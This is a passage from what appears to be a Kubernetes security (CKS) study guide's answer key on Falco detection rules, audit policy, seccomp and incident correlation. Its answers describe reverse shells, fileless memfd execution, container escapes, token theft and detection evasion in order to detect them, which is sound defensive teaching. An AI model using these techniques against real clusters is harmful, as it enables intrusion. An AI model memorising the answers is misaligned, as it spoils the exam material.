**Q6.** Anything that spawns a shell without a controlling terminal, or whose parent is not a runtime shim. Examples: a reverse shell launched by an already-running application process (`nginx` → `sh -i` piped over a socket) has `proc.tty = 0` **and** fails `container_entrypoint` because its parent is `nginx`, not `containerd-shim`. `kubectl exec` *without* `-t` also yields `proc.tty = 0`. The `proc.tty != 0` clause exists to cut noise from init scripts, and that is exactly the gap an attacker uses — which is why you supplement it with the structural rules from Exercise 4.

**Q7.** `open_read` is defined in `falco_rules.yaml`. If the local file loads first, the macro is undefined at the point of reference and Falco reports a **compilation/validation error** for that rule — `Invalid: unknown macro 'open_read'`. Depending on configuration Falco either refuses to start or loads the file with that rule dropped. Definitions must precede use, and `rules_files` order is the definition order.

**Q8.** Maturity tiers encode *false-positive risk*, not age. `stable` rules have been validated against broad, diverse production traffic; `incubating` and `sandbox` rules are useful but known to be noisy or environment-specific. Shipping them enabled would flood every new installation with alerts on day one, and an operator who learns to ignore Falco output has a strictly worse security posture than one with no Falco at all. Alert fatigue is the operational argument — you opt into those tiers deliberately, per environment, after tuning.

**Q9.** Falco resolves `fd.name` from the perspective of the process that issued the syscall, i.e. inside its mount namespace. That is the correct semantic — it is the path the *attacker* used — and it makes rules portable across nodes, since the host-side kubelet path embeds a per-Pod UID that changes on every reschedule. The implication: write path matches against in-container paths (`/var/run/secrets/...`), and never against `/var/lib/kubelet/pods/<uid>/...`. Conversely, a rule meant to catch *host* access must match the host path and will not see the container view.

**Q10.** Copy-paste failure modes: (1) **Silent duplication** — both the shipped rule and your copy load, so every event alerts twice (or, under `rule_matching: first`, the shipped one wins and your edit is inert). (2) **Upgrade drift** — `falcoctl artifact follow` updates `falco_rules.yaml` with improved conditions and new field usage; your frozen copy never receives them, so you quietly run a stale detection while believing you are current. `override` expresses a *delta* against whatever the current upstream rule is, so upgrades compose instead of colliding.

**Q11.** `proc.aname[2]` is the name of the process two levels up the ancestry chain (`aname[0]` is the process itself, `[1]` the parent). It matters because attackers control the immediate process trivially — rename the binary, `exec` through a shell — but the *lineage* reflects how the process was really reached. `nginx → sh → curl` and `containerd-shim → bash → curl` tell completely different stories about the same `proc.name=curl`, and only the ancestry distinguishes "the web server was exploited" from "an operator ran a command".

**Q12.** The field is populated by Falco's container/Kubernetes metadata enrichment. In modern Falco the legacy `-k`/`-K` API-server flags were removed; enrichment comes from the container runtime socket (so Falco must have access to the CRI socket, e.g. `/run/containerd/containerd.sock`) and, for richer Pod metadata, from the `k8smeta` plugin backed by the `k8s-metacollector` deployment. Without enrichment the alert still fires — `container.id` is derived from cgroups and needs nothing external — but `k8s.ns.name` and `k8s.pod.name` render as `<NA>`, and worse, **the rule itself would never match** because `shop_workload` compares `k8s.ns.name` to a literal. That is a real design lesson: prefer enrichment-independent fields in the *condition*, and use enriched fields in the *output*.

**Q13.** An OCI image is a stack of read-only layers; the container's writable layer sits on top as the overlayfs *upper* dir. Every binary baked into the image resolves in a lower layer. So `proc.is_exe_upper_layer=true` means the executable file did not exist when the image was built — it was written after the container started. The legitimate violator is any workload that installs software at runtime: CI/build containers, `apt-get`/`pip install` in an entrypoint, or language runtimes that JIT-compile to disk. Those are exactly the workloads that should be exempted by namespace or image, not by process name.

**Q14.** `memfd_create(2)` returns a file descriptor backed by anonymous memory with no filesystem path; the loader writes the payload into it and calls `execveat()` on the fd. Nothing is ever written to the overlayfs upper layer, so both file-integrity monitoring and the upper-layer rule see nothing. `proc.is_exe_from_memfd = true` catches it (the exe path renders as `memfd:<name>`), which is why the second rule in Exercise 4 exists as a companion, not an afterthought.

**Q15.** No. `cp` creates a *new file* in the upper layer, so this actually **does** fire — the copy is a fresh inode in the writable layer regardless of where the source lived. The rule only misses if the attacker executes the original in place (`/bin/busybox sh`), which is lower-layer and therefore invisible to this signal. That residual gap is covered by name/ancestry rules like `Terminal shell in container`, illustrating why you layer structural and behavioral detections rather than choosing between them.

**Q16.** With `readOnlyRootFilesystem: true` the writable layer is gone, so the `cp` in step 3 fails with `EROFS` and the rule never fires — prevention worked. But `emptyDir` volumes, `/tmp` mounts and `/dev/shm` are still writable and are *not* the overlayfs upper layer, so a payload dropped there and executed evades the rule while the escape still succeeds. Detection remains valuable because it covers the paths prevention deliberately left open, and because it tells you someone *tried*.

**Q17.** `Seccomp: 2` means seccomp mode 2 — a BPF filter is loaded (mode 0 = disabled, mode 1 = strict). The two other lines to check first are **`CapEff`**, the effective capability bitmask (`00000000a80425fb` is the Docker/containerd default set; `0000003fffffffff` means the container is effectively privileged), and **`NoNewPrivs`**, which if `0` allows setuid binaries to escalate — the precondition for a whole class of escapes. `/proc/$PID/ns/` is the third pillar: if the `mnt`, `pid` or `net` inode numbers match the host's (`readlink /proc/1/ns/mnt`), the container shares that namespace with the node.

**Q18.** `ptrace(2)` lets one process read and modify another's memory and intercept its syscalls, so the kernel gates it behind `CAP_SYS_PTRACE` (plus the Yama `ptrace_scope` policy). In the ephemeral-container case you additionally need to *see* the target process: `kubectl debug --target=<container>` puts the debug container in the target's PID namespace, which is what makes `strace -p 1` meaningful. `--profile=sysadmin` (GA in Kubernetes 1.30) sets a `securityContext` with `privileged: true` and a full capability set on the ephemeral container — it is a convenience for exactly this workflow and should never be a default in a policy-enforced namespace.

**Q19.** `ptrace`-based tracing stops the tracee on **every** traced syscall entry and exit and context-switches to the tracer, so cost scales with syscall rate — an order-of-magnitude slowdown on I/O-heavy processes is routine, and on a latency-sensitive service it is an outage. The eBPF alternative attaches to tracepoints in the kernel and writes to a per-CPU ring buffer without stopping the process: `bpftrace` for ad-hoc one-liners, or the same Falco/`sysdig` libs (`sysdig -p ...`) you already have on the node. Cilium Tetragon covers the same ground with in-kernel policy and optional enforcement.

**Q20.** `strace -c` records only the syscalls the process made **during the observation window**. Startup syscalls are missing if you attached late; error paths, log rotation, TLS certificate reload, graceful shutdown and rarely-taken code branches are missing unless you exercised them. A seccomp profile built from that trace will `SIGSYS`-kill the workload the first time it hits an unobserved path — typically in production, typically during an incident. The correct procedure is: run in seccomp **audit** mode (`SCMP_ACT_LOG`) across a full workload lifecycle including failure paths, collect from the audit log, and only then switch to `SCMP_ACT_ERRNO`.

**Q21.** `pods/exec` at `RequestResponse` is safe and valuable: the request body for an exec carries no secret material, and the URI already contains the command, container and Pod — you want the full record because interactive access is inherently high-signal. `secrets` at `RequestResponse` would write the **decoded Secret payload** — passwords, tokens, private keys — into `audit.log` in cleartext, turning your audit trail into the highest-value target on the control plane and typically into a compliance violation. `Metadata` records who read which Secret and when, which is all a detection needs.

**Q22.** The catch-all matches *every* request, so it wins first for all of them and no later rule is ever consulted. You would log everything at `Metadata` level: you lose the `RequestResponse` detail on `pods/exec` and RBAC changes, and you lose all the `level: None` noise suppression, so volume explodes while fidelity drops. Order the policy from most specific to most general, always.

**Q23.** The authorization decision appears in `ResponseComplete` (the `annotations["authorization.k8s.io/decision"]` and `.../reason` fields). `RequestReceived` fires before authorization and carries no outcome, which is why omitting it is nearly free. You would want it back when investigating requests that **never completed** — a client that opened a request and vanished, an API server that hung or crashed mid-request, or a long-running watch — because `ResponseComplete` for those never gets written. There is also `ResponseStarted`, which is what you get for long-running streaming requests.

**Q24.** A denied request reveals **intent without capability** — it is the clearest possible evidence that an identity is being used for something outside its designed purpose, and it is almost never generated by correctly configured software. Allowed requests are ambiguous: they look identical whether the caller is the legitimate controller or an attacker holding its token. A burst of 403s across many resource types from one identity is textbook permission enumeration (`kubectl auth can-i --list`, or a tool like `kubectl-who-can` running from inside a Pod) and it usually precedes the successful action, giving you time to respond.

**Q25.** The **log-file** backend writes locally and never blocks the API server; it loses nothing on the API server side, but Falco must tail the file, so events are lost if the shipper is down and the file rotates before it catches up. The **webhook** backend pushes to Falco over HTTP: if Falco is down, events are dropped after the retry budget is exhausted, and if Falco is slow, batching (`--audit-webhook-batch-max-wait`, `--audit-webhook-batch-max-size`) means the API server buffers and can degrade under back-pressure. Production practice is to run both: file for durability and forensics, webhook for real-time detection.

**Q26.** `priority: notice` in `falco.yaml` is a **global floor** — rules with a severity below `NOTICE` are not even evaluated by the engine, so they cost nothing and can never alert. `priority: CRITICAL` on a rule is that rule's declared severity, used for routing and filtering downstream. Under this configuration an `INFORMATIONAL` rule is silently inert: it loads, `falco -L` lists it, and it will never fire. This is one of the most common "my rule doesn't work" causes — the severity ladder is `EMERGENCY > ALERT > CRITICAL > ERROR > WARNING > NOTICE > INFORMATIONAL > DEBUG`.

**Q27.** With `first`, evaluation stops at the first matching rule in load order. If a broad, low-severity rule (say a `NOTICE`-level "shell in container") is defined before your narrow `CRITICAL` rule for the same event, the generic alert wins and the specific one never fires — you get a low-priority page for what was actually a critical detection. Set `rule_matching: all` when you deliberately want overlapping detections (e.g. a generic rule plus a workload-specific one), and accept the extra evaluation cost.

**Q28.** With buffering enabled, alerts sit in an output buffer until it fills or a timeout expires. During an active intrusion the two things most likely to happen are that the attacker kills the Falco process or takes down the node — and anything still in the buffer is lost, precisely for the events that mattered most. Unbuffered output writes each alert immediately, trading throughput for the guarantee that an alert that was *generated* was also *emitted*.

**Q29.** The kernel-side probe writes events into fixed-size per-CPU ring buffers; if userspace does not drain them fast enough, the kernel overwrites or discards events. Mechanically, you lost syscalls — meaning any rule that needed those events did not fire, and you cannot know which. Reductions: increase buffer size (`engine.kmod.buf_size_preset` / the modern-eBPF ring-buffer sizing, and `--cpus-for-each-buffer`), and cut ingestion volume by trimming the active ruleset or applying `base_syscalls`/event-type filtering so fewer syscalls are captured at all. Treating it as a warning is a mistake because a drop is a **detection outage**, not a performance note — an attacker who generates syscall storms can deliberately induce drops as an evasion technique.

**Q30.** A `.scap` capture stores raw syscall events plus the container metadata resolvable at capture time; Kubernetes Pod/namespace metadata comes from live enrichment against the runtime and the metadata collector, which is unavailable during replay. Fields like `k8s.ns.name` therefore render `<NA>`, and any condition keyed on them will not match. Use captures to regression-test the *syscall-level* logic, and always validate enrichment-dependent conditions live.

**Q31.** Each individual alert has a plausible benign explanation: an SRE runs `kubectl exec` (a), a monitoring agent reads config files (b), a build container writes and runs a binary (e). Every one of them, taken alone, generates enough false positives in a real cluster to be de-prioritized. What has no benign explanation is the **conjunction**: interactive access, followed by credential read, followed by execution of a binary that did not exist at image build time, all in the same container within a minute. Correlation converts several noisy signals into one high-precision one, which is the entire point of behavioral analytics as opposed to rule matching.

**Q32.** The last cheap opportunity was (c), `ls /host/etc/kubernetes/pki` — a process inside a container reading a path that is only reachable because the host root was mounted in. At that moment the attacker had visibility of the cluster CA and control-plane certs but had not yet executed on the node; killing the Pod there contains the incident. Admission-time, a Pod Security Admission `baseline`/`restricted` label on the namespace (or an equivalent Kyverno/Gatekeeper policy) rejects the Pod outright: `restricted` forbids `privileged: true`, and both forbid `hostPath` volumes. The manifest in step 1 would never have been admitted.

**Q33.** The **audit log** catches it. An external attacker replaying the stolen token authenticates as `system:serviceaccount:shop:builder` — the `user.username` field — and, in Kubernetes 1.34 with bound ServiceAccount tokens, the audit entry also carries the token's binding in `user.extra` (`authentication.kubernetes.io/pod-name` and `.../pod-uid`, plus the credential ID). The detection is the mismatch between that recorded Pod binding and the request's `sourceIPs`: a token bound to a Pod on `node01` arriving from an off-cluster address is unambiguous credential theft. Runtime detection sees nothing, because nothing happens on the node.

**Q34.** Low confidence, and specifically **asymmetric** confidence: the alerts you received are still true positives (Falco does not fabricate events), but the *absence* of an alert proves nothing, so you cannot bound the scope of the intrusion from the alert set alone. Remediation is twofold: treat the incident as scope-unknown and fall back on evidence that does not depend on the dropped stream — audit logs, `/proc` state on the node, image and filesystem forensics — and fix the drop condition (larger ring buffers, more buffers per CPU, reduced syscall ingestion) before the next incident. Persistent drops on a node mean that node has no reliable runtime detection.

**Q35.** (1) **Pod Security Admission `restricted`**, or a Kyverno/Gatekeeper policy, rejecting `privileged: true` and `hostPath` — Cluster Setup and Hardening; this breaks the chain at admission, before the Pod exists. (2) **Least-privilege RBAC** — binding the `builder` ServiceAccount to a narrowly scoped Role instead of `admin`, plus `automountServiceAccountToken: false` where the token is not needed — Cluster Hardening; this makes the stolen token in step (d) worthless. (3) **A seccomp profile and a read-only root filesystem with dropped capabilities** — `RuntimeDefault` seccomp blocks the syscalls a `chroot` escape needs, `readOnlyRootFilesystem` blocks the binary drop in (e) — Minimize Microservice Vulnerabilities. Behavioral analytics is what tells you these controls were attacked, and what covers you on the day one of them is misconfigured.

</details>

---

## Sources

- CNCF, *Certified Kubernetes Security Specialist (CKS) Curriculum v1.34* — https://github.com/cncf/curriculum/raw/master/CKS_Curriculum%20v1.34.pdf
- The Falco Project, *Rules* and *Rules Fields* — https://falco.org/docs/concepts/rules/ · https://falco.org/docs/reference/rules/supported-fields/
- The Falco Project, *Falco Configuration* — https://falco.org/docs/reference/daemon/config-options/
- The Falco Project, *Event Sources: Kubernetes Audit Events* — https://falco.org/docs/event-sources/kubernetes-audit/
- The Falco Project, *Installation and Drivers* — https://falco.org/docs/install-operate/installation/ · https://falco.org/docs/concepts/event-sources/kernel/
- Kubernetes, *Auditing* — https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/
- Kubernetes, *Debug Running Pods (ephemeral containers and debugging profiles)* — https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/
- Kubernetes, *Seccomp and Restrict a Container's Syscalls* — https://kubernetes.io/docs/tutorials/security/seccomp/
- Linux `strace(1)`, `ptrace(2)`, `memfd_create(2)`, `auditctl(8)` manual pages — https://man7.org/linux/man-pages/
- MITRE ATT&CK for Containers — https://attack.mitre.org/matrices/enterprise/containers/